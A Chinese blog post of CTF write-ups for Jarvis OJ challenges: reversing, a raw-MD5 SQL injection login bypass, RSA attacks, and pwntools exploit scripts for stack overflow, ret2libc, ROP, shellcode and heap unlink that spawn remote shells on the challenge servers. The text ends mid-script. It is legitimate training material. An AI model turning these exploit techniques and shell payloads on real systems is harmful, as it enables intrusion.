---
layout: post
title:  "Jarvis OJ-从打开网站到去世"
date:   2019-2-12
desc: ""
keywords: ""
categories: [Ctf]
tags: [CTF,JarvisOJ]
icon: icon-html
---

# Jarvis OJ-从打开网站到去世

* #### FindKey

  pyc逆向

  uncompyle得到.py

  ```python
  # uncompyle6 version 3.2.5
  # Python bytecode 2.7 (62211)
  # Decompiled from: Python 2.7.15rc1 (default, Nov 12 2018, 14:31:15) 
  # [GCC 7.3.0]
  # Embedded file name: findkey
  # Compiled at: 2016-04-30 17:54:18
  import sys
  lookup = [
   196, 153, 149, 206, 17, 221, 10, 217, 167, 18, 36, 135, 103, 61, 111, 31, 92, 152, 21, 228, 105, 191, 173, 41, 2, 245, 23, 144, 1, 246, 89, 178, 182, 119, 38, 85, 48, 226, 165, 241, 166, 214, 71, 90, 151, 3, 109, 169, 150, 224, 69, 156, 158, 57, 181, 29, 200, 37, 51, 252, 227, 93, 65, 82, 66, 80, 170, 77, 49, 177, 81, 94, 202, 107, 25, 73, 148, 98, 129, 231, 212, 14, 84, 121, 174, 171, 64, 180, 233, 74, 140, 242, 75, 104, 253, 44, 39, 87, 86, 27, 68, 22, 55, 76, 35, 248, 96, 5, 56, 20, 161, 213, 238, 220, 72, 100, 247, 8, 63, 249, 145, 243, 155, 222, 122, 32, 43, 186, 0, 102, 216, 126, 15, 42, 115, 138, 240, 147, 229, 204, 117, 223, 141, 159, 131, 232, 124, 254, 60, 116, 46, 113, 79, 16, 128, 6, 251, 40, 205, 137, 199, 83, 54, 188, 19, 184, 201, 110, 255, 26, 91, 211, 132, 160, 168, 154, 185, 183, 244, 78, 33, 123, 28, 59, 12, 210, 218, 47, 163, 215, 209, 108, 235, 237, 118, 101, 24, 234, 106, 143, 88, 9, 136, 95, 30, 193, 176, 225, 198, 197, 194, 239, 134, 162, 192, 11, 70, 58, 187, 50, 67, 236, 230, 13, 99, 190, 208, 207, 7, 53, 219, 203, 62, 114, 127, 125, 164, 179, 175, 112, 172, 250, 133, 130, 52, 189, 97, 146, 34, 157, 120, 195, 45, 4, 142, 139]
  pwda = [
   188, 155, 11, 58, 251, 208, 204, 202, 150, 120, 206, 237, 114, 92, 126, 6, 42]
  pwdb = [53, 222, 230, 35, 67, 248, 226, 216, 17, 209, 32, 2, 181, 200, 171, 60, 108]
  flag = raw_input('Input your Key:').strip()
  if len(flag) != 17:
      print 'Wrong Key!!'
      sys.exit(1)
  flag = flag[::-1]
  for i in range(0, len(flag)):
      if ord(flag[i]) + pwda[i] & 255 != lookup[i + pwdb[i]]:
          print 'Wrong Key!!'
          sys.exit(1)
  
  print 'Congratulations!!'
  # okay decompiling findkey.pyc
  
  ```

   

  ```python
  lookup = [
   196, 153, 149, 206, 17, 221, 10, 217, 167, 18, 36, 135, 103, 61, 111, 31, 92, 152, 21, 228, 105, 191, 173, 41, 2, 245, 23, 144, 1, 246, 89, 178, 182, 119, 38, 85, 48, 226, 165, 241, 166, 214, 71, 90, 151, 3, 109, 169, 150, 224, 69, 156, 158, 57, 181, 29, 200, 37, 51, 252, 227, 93, 65, 82, 66, 80, 170, 77, 49, 177, 81, 94, 202, 107, 25, 73, 148, 98, 129, 231, 212, 14, 84, 121, 174, 171, 64, 180, 233, 74, 140, 242, 75, 104, 253, 44, 39, 87, 86, 27, 68, 22, 55, 76, 35, 248, 96, 5, 56, 20, 161, 213, 238, 220, 72, 100, 247, 8, 63, 249, 145, 243, 155, 222, 122, 32, 43, 186, 0, 102, 216, 126, 15, 42, 115, 138, 240, 147, 229, 204, 117, 223, 141, 159, 131, 232, 124, 254, 60, 116, 46, 113, 79, 16, 128, 6, 251, 40, 205, 137, 199, 83, 54, 188, 19, 184, 201, 110, 255, 26, 91, 211, 132, 160, 168, 154, 185, 183, 244, 78, 33, 123, 28, 59, 12, 210, 218, 47, 163, 215, 209, 108, 235, 237, 118, 101, 24, 234, 106, 143, 88, 9, 136, 95, 30, 193, 176, 225, 198, 197, 194, 239, 134, 162, 192, 11, 70, 58, 187, 50, 67, 236, 230, 13, 99, 190, 208, 207, 7, 53, 219, 203, 62, 114, 127, 125, 164, 179, 175, 112, 172, 250, 133, 130, 52, 189, 97, 146, 34, 157, 120, 195, 45, 4, 142, 139]
  pwda = [
   188, 155, 11, 58, 251, 208, 204, 202, 150, 120, 206, 237, 114, 92, 126, 6, 42]
  pwdb = [53, 222, 230, 35, 67, 248, 226, 216, 17, 209, 32, 2, 181, 200, 171, 60, 108]
  flag=""
  for i in range(0, 17):
       flag += chr(lookup[i + pwdb[i]]-pwda[i] & 255)
  flag = flag[::-1]
  print flag
  ```

  `PCTF{PyC_Cr4ck3r}`

* #### 软件密码破解-1

  扔到IDA Pro里发现有一堆函数没法看

  扔OD里

  先查找一波看看有没有重要的字符串

  ![1](https://raw.githubusercontent.com/AiDaiP/images/master/Jarvis%20OJ/1.png)

  定位到''你赢了''，往上翻可以看到一堆比较，应该是关键函数

  ![2](https://raw.githubusercontent.com/AiDaiP/images/master/Jarvis%20OJ/2.png)

  在01021C53断，数据窗口跟随CTF_100_.011977F8

  ![3](https://raw.githubusercontent.com/AiDaiP/images/master/Jarvis%20OJ/3.png)

  输入的数据在ebx，eax=ebx

  `ecx=CTF_100.011977F8-ebx=CTF_100_.011977F8-eax=`

  `dl=ecx+eax=CTF_100_.011977F8`

  CTF_100_.011977F8是`x28, 0x57, 0x64, 0x6B, 0x93, 0x8F, 0x65, 0x51, 0xE3, 0x53, 0xE4, 0x4E, 0x1A, 0xFF`

  每次循环将eax中取出一位和CTF_100_.011977F8中的一位异或，然后eax+1，eax可看作下标

  循环结束后比较异或后每一位的值

  异或后的值应为`0x1B, 0x1C, 0x17, 0x46, 0xF4, 0xFD, 0x20, 0x30, 0xB7, 0x0C, 0x8E, 0x7E, 0x78, 0xDE`

  ```python
  a = [0x28, 0x57, 0x64, 0x6B, 0x93, 0x8F, 0x65, 0x51, 0xE3, 0x53, 0xE4, 0x4E, 0x1A, 0xFF]
  b = [0x1B, 0x1C, 0x17, 0x46, 0xF4, 0xFD, 0x20, 0x30, 0xB7, 0x0C, 0x8E, 0x7E, 0x78, 0xDE]
  flag = ""
  for i,j in zip(a,b):
      flag += chr(i ^ j)
  print flag
  ```

  `flag{3Ks-grEaT_j0b!}`

  

* #### [61dctf]stheasy 

  ![4](https://raw.githubusercontent.com/AiDaiP/images/master/Jarvis%20OJ/4.png)

  看一下8049AE0和8049B15

  ![5](https://raw.githubusercontent.com/AiDaiP/images/master/Jarvis%20OJ/5.png)

  直接写脚本

  ```python
  a = "lk2j9Gh}AgfY4ds-a6QW1#k5ER_T[cvLbV7nOm3ZeX{CMt8SZo]U"
  b = [0x48,0x5D,0x8D,0x24,0x84,0x27,0x99,0x9F,0x54,0x18,0x1E,0x69,0x7E,0x33,0x15,0x72,0x8D,0x33,0x24,0x63,0x21,0x54,0x0C,0x78,0x78,0x78,0x78,0x78,0x1b]
  flag = ""
  for i in b:
      flag += a[i/3 - 2]
  print flag
  ```

  `kctf{YoU_hAVe-GOt-fLg_233333}`

  

* #### DD - Hello

   ![6](https://raw.githubusercontent.com/AiDaiP/images/master/Jarvis%20OJ/6.png)

  其他函数都没啥用，俺寻思这是关键函数

  v2根据strat和sub_100000C90的地址计算

  ```python
  a = [0x41,0x10,0x11,0x11,0x1B,0x0A,0x64,0x67,0x6A,0x68,0x62,0x68,0x6E,0x67,0x68,0x6B,0x62,0x3D,0x65,0x6A,0x6A,0x3D,0x68,0x4,0x5,0x8,0x3,0x2,0x2,0x55,0x8,0x5D,0x61,0x55,0x0A,0x5F,0x0D,0x5D,0x61,0x32,0x17,0x1D,0x19,0x1F,0x18,0x20,0x4,0x2,0x12,0x16,0x1E,0x54,0x20,0x13,0x14]
  v2 = (0x100000CB0-0x100000C90>>2)^a[0]
  flag = ""
  for i in range(55):
      flag += chr((a[i]-2) ^ v2)
      v2 += 1
  print flag
  ```

  `DDCTF-5943293119a845e9bbdbde5a369c1f50@didichuxing.com`

  

* #### [61dctf]admin

   页面上只有一个hello world，抓包也没什么用

  ![7](https://raw.githubusercontent.com/AiDaiP/images/master/Jarvis%20OJ/7.png)

  扫一下，发现robot.txt

  内容是`Disallow: /admin_s3cr3t.php`

  进入`admin_s3cr3t.php`，出现`flag{hello guest} `

  假flag，抓包

  ![8](https://raw.githubusercontent.com/AiDaiP/images/master/Jarvis%20OJ/8.png)

  把admin=0改成1得到flag

  `flag{hello_admin~}`

  

* #### Login

   ![9](https://raw.githubusercontent.com/AiDaiP/images/master/Jarvis%20OJ/9.png)

  改admin没什么用

  发现hint

  ```sql
  select * from `admin` where password='".md5($pass,true)."'
  ```

  `md5('ffifdyop',true)='or'6�]��!r,��b`

  输入`ffifdyop`组成sql语句

  ```sql
  select * from admin where password=''or'6�]��!r,��b'
  ```

  成功绕过

  ![10](https://raw.githubusercontent.com/AiDaiP/images/master/Jarvis%20OJ/10.png)

  `PCTF{R4w_md5_is_d4ng3rous} `



* #### Medium RSA 

  题目给了公钥和密文

  ```
  OpenSSL> rsa -pubin -text -modulus -in pubkey.pem
  Public-Key: (256 bit)
  Modulus:
      00:c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f:
      1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f:
      be:30:dd
  Exponent: 65537 (0x10001)
  Modulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD
  writing RSA key
  -----BEGIN PUBLIC KEY-----
  MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDr
  yigb/+l/vjDdAgMBAAE=
  -----END PUBLIC KEY-----
  ```

  ![11](https://raw.githubusercontent.com/AiDaiP/images/master/Jarvis%20OJ/11.png)

  ```
  N = 87924348264132406875276140514499937145050893665602592992418171647042491658461
  E = 65537
  P = 275127860351348928173285174381581152299
  Q = 319576316814478949870590164193048041239
  d = 10866948760844599168252082612378495977388271279679231539839049698621994994673
  ```

  ```
  import math
  import sys
  from Crypto.PublicKey import RSA
  
  keypair = RSA.generate(1024)
  
  keypair.p = 275127860351348928173285174381581152299
  keypair.q = 319576316814478949870590164193048041239
  keypair.e = 65537
  
  keypair.n = keypair.p * keypair.q
  Qn = long((keypair.p-1) * (keypair.q-1))
  
  i = 1
  while (True):
      x = (Qn * i ) + 1
      if (x % keypair.e == 0):
          keypair.d = x / keypair.e
          break
      i += 1
  
  private = open('private.pem','w')
  private.write(keypair.exportKey())
  private.close()
  ```

  得到私钥，解密得到flag

  `PCTF{256b_i5_m3dium`

* #### Extremely hard RSA

   e = 3

   小公钥指数攻击

   ```python
   import gmpy
   import rsa
   from rsa import transform,core
   
   c = open('flag.enc','rb').read()
   c = transform.bytes2int(c)
   n = 721059527572145959497866070657244746540818298735241721382435892767279354577831824618770455583435147844630635953460258329387406192598509097375098935299515255208445013180388186216473913754107215551156731413550416051385656895153798495423962750773689964815342291306243827028882267935999927349370340823239030087548468521168519725061290069094595524921012137038227208900579645041589141405674545883465785472925889948455146449614776287566375730215127615312001651111977914327170496695481547965108836595145998046638495232893568434202438172004892803105333017726958632541897741726563336871452837359564555756166187509015523771005760534037559648199915268764998183410394036820824721644946933656264441126738697663216138624571035323231711566263476403936148535644088575960271071967700560360448191493328793704136810376879662623765917690163480410089565377528947433177653458111431603202302962218312038109342064899388130688144810901340648989107010954279327738671710906115976561154622625847780945535284376248111949506936128229494332806622251145622565895781480383025403043645862516504771643210000415216199272423542871886181906457361118669629044165861299560814450960273479900717138570739601887771447529543568822851100841225147694940195217298482866496536787241L
   print(hex(c))
   def dec(c,N):
   	i=0
   	#i = 118719488
   	while 1:
   		print(i)
   		if(gmpy.root(c+i*N, 3)[1]==1):
   			print(gmpy.root(c+i*N, 3))
   			break
   		i=i+1
   dec(c,n)
   
   m = 440721643740967258786371951429849843897639673893942371730874939742481383302887786063966117819631425015196093856646526738786745933078032806737504580146717737115929461581126895844008044713461807791172016433647699394456368658396746134702627548155069403689581548233891848149612485605022294307233116137509171389596747894529765156771462793389236431942344003532140158865426896855377113878133478689191912682550117563858186
   
   m = transform.int2bytes(m)
   print(m)
   #PCTF{Sm4ll_3xpon3nt_i5_W3ak}
   ```

* #### very hard RSA

   共模攻击

   ```python
   #-*- coding: UTF-8 -*-
   import gmpy2
   import rsa
   from rsa import transform,core
   
   n = 0x00b0bee5e3e9e5a7e8d00b493355c618fc8c7d7d03b82e409951c182f398dee3104580e7ba70d383ae5311475656e8a964d380cb157f48c951adfa65db0b122ca40e42fa709189b719a4f0d746e2f6069baf11cebd650f14b93c977352fd13b1eea6d6e1da775502abff89d3a8b3615fd0db49b88a976bc20568489284e181f6f11e270891c8ef80017bad238e363039a458470f1749101bc29949d3a4f4038d463938851579c7525a69984f15b5667f34209b70eb261136947fa123e549dfff00601883afd936fe411e006e4e93d1a00b0fea541bbfc8c5186cb6220503a94b2413110d640c77ea54ba3220fc8f4cc6ce77151e29b3e06578c478bd1bebe04589ef9a197f6f806db8b3ecd826cad24f5324ccdec6e8fead2c2150068602c8dcdc59402ccac9424b790048ccdd9327068095efa010b7f196c74ba8c37b128f9e1411751633f78b7b9e56f71f77a1b4daad3fc54b5e7ef935d9a72fb176759765522b4bbc02e314d5c06b64d5054b7b096c601236e6ccf45b5e611c805d335dbab0c35d226cc208d8ce4736ba39a0354426fae006c7fe52d5267dcfb9c3884f51fddfdf4a9794bcfe0e1557113749e6c8ef421dba263aff68739ce00ed80fd0022ef92d3488f76deb62bdef7bea6026f22a1d25aa2a92d124414a8021fe0c174b9803e6bb5fad75e186a946a17280770f1243f4387446ccceb2222a965cc30b3929
   e1 = 17
   e2 = 65537
   s = gmpy2.gcdext(e1,e2)
   s1 = s[1]
   s2 = -s[2]
   file1 = open("flag.enc1" ,'rb').read()
   c1 = transform.bytes2int(file1)
   file2 = open("flag.enc2" ,'rb').read()
   c2 = transform.bytes2int(file2)
   c2 = gmpy2.invert(c2, n)#c2的s2次幂等于c2的模反元素的-s2次幂。
   m = (pow(c1,s1,n) * pow(c2,s2,n)) % n
   m = transform.int2bytes(m)
   print(m)
   #PCTF{M4st3r_oF_Number_Th3ory}
   ```

* #### [61dctf]rsappend

   共模攻击

   ```python
   #-*- coding: UTF-8 -*-
   import gmpy2
   import rsa
   from rsa import transform,core
   
   n = 130129008900473203968454456805638875182255844172836031362469765750555629223299054613072677100571707156698316733582683118539756860001556017029333867329591302318262912728008327902112481960175532302595162289611406978353816368008691640641366763939266242207191229240305820321249712345088877729541037319788659353057396178127928848886417880913823432701577855911982710310391664759040416918636673098245499680559140960154217578440590540485803953844560093151975252604098243460784073934982164384904788470380402066708313893480356219937915540825156266934523595689350157227336528136089157698775968997579723271988825396396444999743016035145444220925369592263295741687879468786947998534483539986779457827253891091252408156073413533385415338751818544323853074296042153599429749378847870780593975579477549218822682233583377677693108437331184962345568217859524495625257015837972947971787321584159575618388588687948368216479955807108888453821700067186732627409832722329355336479016104249514839541606562090752437124270651936485389358065775555250883907067083447197860848471728871909151915883316674512739238840179296263390441457949281128267215916340163366686542160467601357340644950755337706786366316621293666173843528346692669268972961669116101104865152273L
   
   e1 = 3493354673
   e2 = 340864687
   s = gmpy2.gcdext(e1,e2)
   s1 = s[1]
   s2 = -s[2]
   c1 = 95302089605615051645253770338205531172677353498946580682786822045513597212422921981567826452072575982096979591435896082106066368909398510427324124083956090397824543655853708684901332136907086372208856759943292176759073194584568350898675282883285945088425893961769183074018286761903249180704401358403273776903672507958464947244563165564687651203497198317095965140433811056890812018746508121991041040929574993486548175817290824525606551459788553765629416110310419007396912225733599205599864440826319234419035248234403040065378375700430311931418759746223148198205862641252459687694589780856855757703678024583642215076094232444641853081607984934672271461513190437757388818064739151861157236855430066735235471068167602037785718403200529481153399754491247323829122718485697100562237822159608309949585990842201041193231738706398444530233533281604482892716292766323711237917277799500317596333142843576977429802405873159965636003943698854699972663575602383960580472190300576561953143218321528070200681456278974433060654128626428761278953024384187213765974659768657721533448706022075747036347982370028705538843276631102928500802573434484354218539824751579164697748967608238067706842975984077663380114254296902060435479795741671231918448537178
   
   c2 = 105918022590727868761989308441554006325741233318901416621101439141134508212362387984949614887131575960019253866892976283979646611794365370050551871112439674346802340152058463892106629344277362169322187627579360245792142005899616101515519718660483000821415412306495286717542069436530262341500852884860324349096274655178057271529986597578695272732947460673640986877589225588415523871081101162696385279491410034057376225511693022693861779342120101749193614060384925056132593068290214170342896671210026723193650534803792328917982049779674425511275821311773130342656939142955431868128759911406827872932920704284125816103225607727270365652734742083302757644298457617564597237089509337896240249999242834787525341715546373108420197569425092674224333823552432226153066667988737348643469923827028254712179077001007265954488404167147591307425224250970874724864947175449960116685682348915647317191880538777148647712260093008241728509225817352093441924045801257015598517963598799676359095235231066752986688784477694024390356904157694178691411759003004184256950519184836209393583431328640341243629167223114681734264945594931213193459079614652400888215324779908031661350565230685273639666615465296133672907093946148188967451042301308884510424218096
   
   c2 = gmpy2.invert(c2, n)
   m = (pow(c1,s1,n) * pow(c2,s2,n)) % n
   m = transform.int2bytes(m)
   print(m)
   #flag{we_do_ctf_together_for_fun}
   ```

   

* #### hard RSA

   e = 2，Rabin算法

   ```python
   # coding=utf-8
   import gmpy2
   import string
   from rsa import transform,core
   n = 87924348264132406875276140514499937145050893665602592992418171647042491658461L
   e = 2
   p = 275127860351348928173285174381581152299
   q = 319576316814478949870590164193048041239
   c = open("flag.enc" ,'rb').read()
   c = transform.bytes2int(c)
   # 计算yp和yq
   inv_p = gmpy2.invert(p, q)
   inv_q = gmpy2.invert(q, p)
   
   # 计算mp和mq
   mp = pow(c, (p + 1) / 4, p)
   mq = pow(c, (q + 1) / 4, q)
   
   # 计算a,b,c,d
   a = (inv_p * p * mq + inv_q * q * mp) % n
   b = n - int(a)
   c = (inv_p * p * mq - inv_q * q * mp) % n
   d = n - int(c)
   
   for i in (a, b, c, d):
       print(transform.int2bytes(i))
   #PCTF{sp3ci4l_rsa}
   ```

   

* #### bbencode 

  ```python
  def str2num(s):
      return int(s.encode('hex'), 16)
  def bbencode(n):
      a = 0
      for i in bin(n)[2:]:
          a = a << 1
          if (int(i)):
              a = a ^ n
          if a >> 256:
              a = a ^ 0x10000000000000000000000000000000000000000000000000000000000000223L
      return a
  
  flag = 61406787709715709430385495960238216763226399960658358000016620560764164045692
  for i in range(10000000):
      flag = bbencode(flag)
      if '666c6167' == str(hex(flag))[2:10]:
          print (hex(flag)[2:-1].decode('hex'))   
  #result:61406787709715709430385495960238216763226399960658358000016620560764164045692
  ```

  密文继续加密就能出flag

* #### vigenere 

  出自TWCTF2016，Blue-Whale OJ上也收了这题，我寻思根据base64解密后全部为可打印字符来搞出来密钥长度，于是就开始手动爆破(mdzz)

  爆破过程就不发上来了

* #### 影之密码 

  密文`8842101220480224404014224202480122 `

  flag是8位大写字母

  有7个0正好分成八段，只有1248四个数字，应该和2^n有点关系

  查了一波和2^n有关系的加密方法，有一种叫做二进制幂数加密法

  任意的十进制数都可以用2^n或2^n+2^m+……的形式表示出来，可表示的单元数=2^(n+1)-1，只要2的0、1、2、3、4次幂就可以表示31个单元。通过用二进制幂数表示字母序号数来加密 

  `23 5 12 12 4 15 14 5`

  `WELLDONE `

  

* #### Tell Me Something 

  ```python
  from pwn import *
  sh = remote("pwn.jarvisoj.com",9876)
  payload = 'a'*136 + p64(0x0000000000400620) 
  sh.recvuntil("message:\n")
  sh.sendline(payload)
  print(sh.recv())
  #PCTF{This_is_J4st_Begin}
  ```

* #### Test Your Memory

   ```python
   from pwn import *
   sh = remote("pwn2.jarvisoj.com",9876)
   elf =ELF("./memory") 
   win_func_addr = elf.symbols['win_func']
   catFlag_addr = 0x080487E0
   padding = 'a' * (0x13 + 0x4)
   payload = padding
   payload += p32(win_func_addr) + p32(0x08048677) + p32(catFlag_addr)
   
   sh.sendline(payload)
   print(sh.recv())
   print(sh.recv())
   #CTF{332e294fb7aeeaf0e1c7703a29304343}
   ```

* #### Smashes 

   ```python
   from pwn import *
   r = remote('pwn.jarvisoj.com',9877)
   flag_addr = 0x400d20
   payload = 'a' * 0x218 + p64(flag_addr)
   #payload = p64(0x400d21) * 1000
   r.sendline(payload)
   r.interactive()
   #PCTF{57dErr_Smasher_good_work!}
   ```

   

* #### [XMAN]level0

  64位文件

  ![12](https://raw.githubusercontent.com/AiDaiP/images/master/Jarvis%20OJ/12.png)

  在read处溢出，调用callsystem

  buf大小为0x80，填充buf，覆盖rbp，改vulnerable_function的返回地址

  ```python
  from pwn import *
  r = remote('pwn2.jarvisoj.com', 9881)
  call = p64(0x400596)
  payload = 'a'*0x88 + call
  r.sendline(payload)
  r.interactive()
  ```

  ![13](https://raw.githubusercontent.com/AiDaiP/images/master/Jarvis%20OJ/13.png)

  `CTF{713ca3944e92180e0ef03171981dcd41}`

  

* #### [XMAN]level1

  ![14](https://raw.githubusercontent.com/AiDaiP/images/master/Jarvis%20OJ/14.png)

  在read处溢出，前面输出buf的地址

  没有system函数

  ![15](https://raw.githubusercontent.com/AiDaiP/images/master/Jarvis%20OJ/15.png)

  没有开启NX，可以用shellcode

  buf的大小为0x88，输入shellcode，填充buf，覆盖ebp，把返回地址改为buf的地址

  ```python
  from pwn import *
  r = remote('pwn2.jarvisoj.com', 9877)
  context(log_level = 'debug', arch = 'i386', os = 'linux')
  shellcode = asm(shellcraft.sh())
  a = r.recvline()[14: -2]
  buf = int(a,16)
  payload = shellcode + 'a'*(0x88+0x4-len(shellcode)) + p32(buf)
  r.sendline(payload)
  r.interactive()
  
  ```

  ![16](https://raw.githubusercontent.com/AiDaiP/images/master/Jarvis%20OJ/16.png)

  `CTF{82c2aa534a9dede9c3a0045d0fec8617}`

  

* #### [XMAN]level2

  在read处溢出，有system函数

  查找有没有/bin/sh

  ![18](https://raw.githubusercontent.com/AiDaiP/images/master/Jarvis%20OJ/18.png)

  可以构造system("/bin/sh") 

  填充buf，覆盖ebp，把返回地址改为system的地址，设置system的返回地址，传参给system

  ```python
  from pwn import *
  r = remote('pwn2.jarvisoj.com',9878)
  system =p32(0x8048320)
  binsh = p32(0x804a024)
  payload = 'a'*(0x88+4) + system + p32(0) + binsh
  r.sendline(payload)
  r.interactive()
  #CTF{1759d0cbd854c54ffa886cd9df3a3d52}
  ```

   ![19](https://raw.githubusercontent.com/AiDaiP/images/master/Jarvis%20OJ/19.png)

* #### [XMAN]level2(x64)

   ```python
   from pwn import *
   r = remote('pwn2.jarvisoj.com', 9882)
   sys_addr = 0x4004C0
   pop_rdi_ret = 0x4006b3
   binsh = 0x600A90
   padding = 'a' * (0x80 + 0x8)
   payload = padding + p64(pop_rdi_ret) + p64(binsh) + p64(sys_addr)
   r.sendline(payload)
   r.interacctive()
   #CTF{081ecc7c8d658409eb43358dcc1cf446}
   ```

   

* ####  [XMAN]level3

   ![21](https://raw.githubusercontent.com/AiDaiP/images/master/Jarvis%20OJ/21.png)

     开了NX，给出libc，考虑ret2libc

     ![22](https://raw.githubusercontent.com/AiDaiP/images/master/Jarvis%20OJ/22.png)

     read处存在溢出

     两次溢出，第一次溢出调用write，打印出一个函数的真实地址，通过这个地址和该函数在libc中的偏移地址计算libc基址，最终得到system的真实地址，第二次溢出执行system("/bin/sh")	

   ```python
     from pwn import *
     
     r = remote("pwn2.jarvisoj.com",9879)
     elf = ELF("./level3")
     libc = ELF("./libc-2.19.so")
     write_plt = elf.plt["write"]
     libc_start_got = elf.got['__libc_start_main']
     func = elf.symbols["vulnerable_function"]
     system_libc = libc.symbols["system"]
     binsh_libc = libc.search("/bin/sh").next()
     libc_start_libc = libc.symbols["__libc_start_main"]
     padding = 'a' * (0x88 + 0x4)
     payload1 = padding + p32(write_plt) + p32(func) + p32(1)+p32(libc_start_got)+p32(4) 
     r.recvuntil("Input:\n")
     r.sendline(payload1)
     
     leak_addr = u32(r.recv(4))
     libc_base = leak_addr - libc_start_libc
     system_addr = libc_base + system_libc
     binsh_addr = libc_base + binsh_libc
     
     payload2 = padding + p32(system_addr) + p32(func) + p32(binsh_addr)
     r.recvuntil("Input:\n")
     r.sendline(payload2)
     r.interactive()
     #CTF{d85346df5770f56f69025bc3f5f1d3d0}
   ```

* #### [XMAN]level3(x64)

   ```python
   from pwn import *
   r = remote('pwn2.jarvisoj.com', 9883)
   elf = ELF('./level3_x64')
   libc = ELF('./libc-2.19.so')
   
   pwn_addr = 0x4005E6
   sys_libc = libc.symbols['system']
   write_libc = libc.symbols['write']
   binsh_libc = libc.search('/bin/sh').next()
   
   write_plt = elf.plt['write']
   write_got = elf.got['write']
   
   pop_rdi_ret = 0x4006b3
   pop_rsi_p_r_ret = 0x4006b1
   padding = 'a' * (0x80 + 0x8)
   
   payload = padding
   payload += p64(pop_rdi_ret) + p64(1)
   payload += p64(pop_rsi_p_r_ret) + p64(write_got) + p64(8)
   payload += p64(write_plt)
   payload += p64(pwn_addr)
   
   r.recvuntil('Input:\n')
   r.sendline(payload)
   leak_addr = u64(r.recv(8))
   #print(hex(leak_addr))
   
   libc_base = leak_addr - write_libc
   binsh = binsh_libc + libc_base
   system = sys_libc + libc_base
   
   payload2 = padding + p64(pop_rdi_ret) + p64(binsh) + p64(system) + p64(0)
   r.recvuntil('Input:\n')
   r.sendline(payload2)
   r.interactive()
   #CTF{b1aeaa97fdcc4122533290b73765e4fd}
   ```

   

* #### [XMAN]level4

   ![23](https://raw.githubusercontent.com/AiDaiP/images/master/Jarvis%20OJ/23.png)

    ![24](https://raw.githubusercontent.com/AiDaiP/images/master/Jarvis%20OJ/24.png)

   栈溢出，ret2libc

   先通过write搞到system地址，没给出libc那就用DynELF

   搞到地址之后再次溢出，先调用read在bss段写入/bin/sh，返回到system执行

   ```python
   from pwn import *
   r = remote('pwn2.jarvisoj.com', 9880)
   elf = ELF('./level4')
   padding = 'a' * (0x88 + 0x4)
   write_addr = elf.plt['write']
   main_addr = elf.symbols['main']
   read_addr = elf.plt['read']
   
   def leak(addr):
   	payload = padding
   	payload += p32(write_addr)
   	payload += p32(main_addr)
   	payload += p32(1) + p32(addr) + p32(4)
   	r.sendline(payload)
   	leak_addr = r.recv(4)
   	return leak_addr
   
   d = DynELF(leak,elf = ELF('./level4'))
   system_addr = d.lookup('system','libc')
   print(hex(system_addr))
   
   bss_addr = elf.bss()
   payload1 = padding
   payload1 += p32(read_addr)
   payload1 += p32(system_addr)
   payload1 += p32(0) + p32(bss_addr) + p32(8)
   payload1 += p32(bss_addr)
   
   r.sendline(payload1)
   r.sendline('/bin/sh\0')
   r.interactive()
   #CTF{882130cf51d65fb705440b218e94e98e}
   ```

   

* #### [XMAN]level5

   假设system和execve函数被禁用 

   ```c
   //mprotect() 
   #include <unistd.h>
   #include <sys/mmap.h>
   int mprotect(const void *start, size_t len, int prot);
   
   /*
   把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。
   */
   ```

   先通过write泄露libc，然后调用mprotect()把bss段权限设为可读可写可执行（7），再调用read()在bss段写入shellcode，返回到bss段执行shellcode

   ```python
   from pwn import *
   import sys
   r = remote('pwn2.jarvisoj.com', 9884)
   elf = ELF('./level3_x64')
   libc = ELF('./libc-2.19.so')
   context.binary = "./level3_x64"
   
   shellcode = asm(shellcraft.sh())
   padding = 'a' * (0x80 + 0x8)
   pwn_addr = 0x4005E6
   
   write_plt = elf.plt['write']
   write_got = elf.got['write']
   write_libc =  libc.symbols['write']
   
   read_plt = elf.plt['read']
   
   mprotect_libc = libc.symbols['mprotect']
   
   pop_rdi_ret = 0x4006b3
   pop_rsi_p_r_ret = 0x4006b1
   
   payload = padding
   payload += p64(pop_rdi_ret) + p64(1)
   payload += p64(pop_rsi_p_r_ret) + p64(write_got) + p64(8)
   payload += p64(write_plt)
   payload += p64(pwn_addr)
   
   
   r.recvuntil('Input:\n')
   r.sendline(payload)
   leak_addr = u64(r.recv(8))
   
   libc_base = leak_addr - write_libc
   mprotect = libc_base + libc.symbols['mprotect']
   pop_rsi = libc_base + 0x24885
   pop_rdx = libc_base + 0x1B8E
   
   
   payload2 = padding + p64(pop_rdi_ret)
   payload2 += p64(0x600000) + p64(pop_rsi)
   payload2 += p64(0x10000) + p64(pop_rdx)
   payload2 += p64(7) + p64(mprotect) + p64(pwn_addr)
   r.recvuntil('Input:\n')
   r.sendline(payload2)
   
   bss = elf.bss()
   
   payload3 = padding + p64(pop_rdi_ret)
   payload3 += p64(0) + p64(pop_rsi)
   payload3 += p64(bss) + p64(pop_rdx)
   payload3 += p64(0x100) + p64(read_plt) + p64(bss)
   r.recvuntil('Input:\n')
   r.sendline(payload3)
   r.send(shellcode)
   
   r.interactive()
   
   ```

* #### Guestbooks2

   chunk0储存chunk指针

   1. free chunk4、chunk2，此时chunk2的fd指向chunk4
   2. edit chunk1，覆盖到chunk2的fd前，list可获得chunk4地址
   3. unlink
   4. 泄露libc
   5. 改atoi的got，getshell

   ```python
   from pwn import *
   context.terminal = ['deepin-terminal', '-x', 'sh' ,'-c']
   #r = remote('pwn.jarvisoj.com',9879)
   #context.log_level = "debug"
   r = process(['./guestbook2'],env = {"LD_PRELOAD":"./libc.so.6"})
   elf = ELF('./guestbook2')
   libc = ELF('./libc.so.6')
   
   def list():
   	r.sendlineafter('Your choice:','1')
   
   def new(post):
   	r.sendlineafter('Your choice:','2')
   	r.sendlineafter('Length of new post:',str(len(post)))
   	r.sendlineafter('Enter your post:',post)
   
   def edit(index, post):
   	r.sendlineafter('Your choice:','3')
   	r.sendlineafter('Post number:',str(index))
   	r.sendlineafter('Length of post:',str(len(post)))
   	r.sendlineafter('Enter your post:',post)
   
   def delete(index):
   	r.sendlineafter('Your choice:','4')
   	r.sendlineafter('Post number:',str(index))
   
   for i in range(10):
   	new('f**k')
   
   #leak heap
